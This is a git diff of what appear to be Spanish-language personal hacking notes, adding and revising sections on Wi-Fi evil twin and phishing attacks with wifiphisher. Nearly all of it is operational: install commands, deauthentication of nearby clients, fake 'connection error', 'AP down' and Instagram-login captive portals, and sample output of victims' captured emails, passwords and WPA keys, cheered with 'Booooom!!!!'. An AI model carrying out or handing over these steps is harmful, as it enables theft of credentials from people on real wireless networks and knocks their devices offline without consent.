@@ -2829,7 +2829,7 @@ Ok, this is solved now. On v10.41 it will be able to work in both modes. Default
 
 
 
-## `Evil Twin` + `Phishing`
+## `Evil Twin` @ `wifiphisher`
 
 ### Ejemplos
 
@@ -2845,15 +2845,16 @@ Ok, this is solved now. On v10.41 it will be able to work in both modes. Default
 apt install -y wifiphisher
 ````
 
-### Alcances
+### Importante
 
-- **Este ataque necesita 2 adaptadores como mínimo**
+- Los ataques con `wifiphisher` necesitan `x2 adaptadores` para poder funcionar _(Uno hace `Packet Inyection` y el Otro hace `Deauth-Attack`)_
 
 ---
 
-### Ataque con "Error de conexión falsa": (No necesita Internet)
+### `Ataque`: "Error de conexión" fake
 
 - Aquí no es necesario dar Internet a la victima con `systemctl start NetworkManager.service` ya que le mandará un error de conexión falso en lo que se extraen sus credenciales
+- **Este ataque necesita 2 adaptadores como mínimo**
 
 ````sh
 # 1. Capturar Redes alrededor (Aquí debemos elegir al objetivo que vamos a clonar para el ataque)
@@ -2891,13 +2892,13 @@ wifiphisher
 # 5. Salir de esa pantalla dando ESCAPE, se mostrará lo capturado que fue escrito por la víctima, por ejemplo:
 
     ## [+] Captured credentials:
-    ## wfphshr-email=User_Fz3r0@mail.net&wfphshr-password=Sup3r_H4rd_p4ssw0rd_no_break_or????? <<<------||| Booooom!!!! ;) 
+    ## wfphshr-email=User_Fz3r0@mail.net&wfphshr-password=Sup3r_H4rd_p4ssw0rd_no_break_or?????     <<<------||| Booooom!!!! ;) 
     ## [!] Closing                                                                                  
 ````
 
 ---
 
-### Ataque de falsa caída de AP: (Necesita Internet)
+### `Ataque`: "Caída de AP" fake
 
 - Revisar que SI haya Internet en el atacante usando `systemctl start NetworkManager.service`.
 
@@ -2931,13 +2932,13 @@ wifiphisher
 # 5. Salir de esa pantalla dando ESCAPE, se mostrará lo capturado que fue escrito por la víctima, por ejemplo:
 
     ## [+] Captured credentials:
-    ## wfphshr-wpa-password=passwoerd_mine_su3r_h4rd
+    ## wfphshr-wpa-password=passwoerd_mine_su3r_h4rd     <<<------||| Booooom!!!! ;)
     ## [!] Closing                                                                                      
 ````
 
 ---
 
-### Ataque Phishing & Ingeniería Social `Redes Sociales`
+### `Ataque`: Phishing & Ingeniería Social
 
 - Revisar que SI haya Internet en el atacante usando `systemctl start NetworkManager.service`.
 
@@ -2956,9 +2957,41 @@ cp -r /home/fz3r0/Documents/CWAP/extra-phishing-pages/* /usr/lib/python3/dist-pa
 
 ---
 
-### Ataque Phishing & Ingeniería Social `Redes Sociales`: Manual
+### `Ataque` Phishing & Ingeniería Social - Redes Sociales: `Manual`
 
+- Esto sirve para que el `AP` y el `SSID` se llame de cualquier manera _(sin necesidad de clonar un `SSID`)_ y al final redirigir a la víctima un `malicious captive portal`
+- Revisar que SI haya Internet en el atacante usando `systemctl start NetworkManager.service`.
 
+````sh
+# 1. Lanzar wifiphisher con flag -e para incluír el SSID y -p para seleccionar el portal
+    # Importante! -kN se usa para no parar el proceso que deja sin Internet
+wifiphisher -e "Fz3r0-Free-Internet" -p instagram-login -kN
+
+# 2. Una vez seleccionado, automáticamente empezará el ataque:
+
+#                                                                                                                  |                             
+# Extensions feed:                                                                                                 | Wifiphisher 1.4GIT          
+# DEAUTH/DISAS - 5c:aa:fd:12:70:0f                                                                                 | ESSID: Fz3r0-Free-Internet  
+# DEAUTH/DISAS - 30:45:96:d7:f2:3e                                                                                 | Channel: 6                  
+# DEAUTH/DISAS - da:a1:19:48:5b:2d                                                                                 | AP interface: wlan1         
+# DEAUTH/DISAS - a0:bd:1d:03:54:c4                                                                                 | Options: [Esc] Quit         
+# Victim 44:e5:17:6:e4:60 probed for WLAN with ESSID: 'Fz3r0-Free-Internet' (Evil Twin)                            |_____________________________
+# Connected Victims:                                                                                                                             
+# 44:e5:17:06:e4:60       10.0.0.57       Unknown Windows                                                                                        
+#                                                                                                                                                
+# HTTP requests:                                                                                                                                 
+# [*] GET request from 10.0.0.57 for http://detectportal.firefox.com/canonical.html                                                              
+# [*] GET request from 10.0.0.57 for http://detectportal.firefox.com/canonical.html                                                              
+# [*] GET request from 10.0.0.57 for http://detectportal.firefox.com/canonical.html                                                              
+# [*] GET request from 10.0.0.57 for http://detectportal.firefox.com/canonical.html                                                              
+# [*] GET request from 10.0.0.57 for http://detectportal.firefox.com/canonical.html
+
+# 5. Salir de esa pantalla dando ESCAPE, se mostrará lo capturado que fue escrito por la víctima, por ejemplo:
+
+    ## [+] Captured credentials:
+    ## wfphshremail=Fz3r0@email.net&wfphshrpassword=P4$$w0rdSup3rHard_?!wawa     <<<------||| Booooom!!!! ;)
+    ## [!] Closing    
+````
 
 
 
